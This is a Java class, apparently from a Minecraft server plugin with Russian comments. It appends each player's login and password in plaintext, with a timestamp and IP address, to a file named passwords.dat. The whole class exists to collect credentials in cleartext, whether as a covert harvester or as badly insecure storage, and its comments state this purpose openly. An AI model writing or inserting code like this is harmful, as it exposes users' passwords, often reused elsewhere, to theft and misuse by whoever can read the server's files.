package moofPl;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.text.SimpleDateFormat;
import java.util.Date;

public class Passwords {
	Main main;
	File log;
	FileWriter filewriter;
	BufferedWriter buffwriter;
	SimpleDateFormat sdf;

	/**
	 * Генератор нового объекта этого класса
	 *
	 * @param main
	 *            - главный метод. Праметр служит для получения папки сервера.
	 */
	public Passwords(Main main2) {
		main = main2;
		log = new File(main.getDataFolder1(), "passwords.dat");
		try {
			if (!log.exists())
				log.createNewFile();
			filewriter = new FileWriter(log, true);
		} catch (Throwable e) {
			e.printStackTrace();
		}
		buffwriter = new BufferedWriter(filewriter);
		sdf = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss z");
	}

	/**
	 * Закрывает поток файла
	 *
	 * @throws Throwable
	 *             - ошибка при закрытии потоков. Никогда не бывает.
	 */
	public void close() throws Throwable {
		buffwriter.close();
		filewriter.close();
	}

	/**
	 * Пишет в файл дату, время, часовой пояс, IP и логин:пароль
	 *
	 * @param login
	 *            - логин игрока
	 * @param password
	 *            - пароль игрока
	 * @param ip
	 *            - IP игрока
	 */
	public void write(String login, String password, String ip) {
		try {
			if (!log.exists())
				log.createNewFile();
			String toWrite = "[" + sdf.format(new Date()) + " " + ip + "] " + login + ":" + password;
			buffwriter.write(toWrite);
			buffwriter.newLine();
			buffwriter.flush();
		} catch (Throwable t) {
			t.printStackTrace();
		}
	}
}
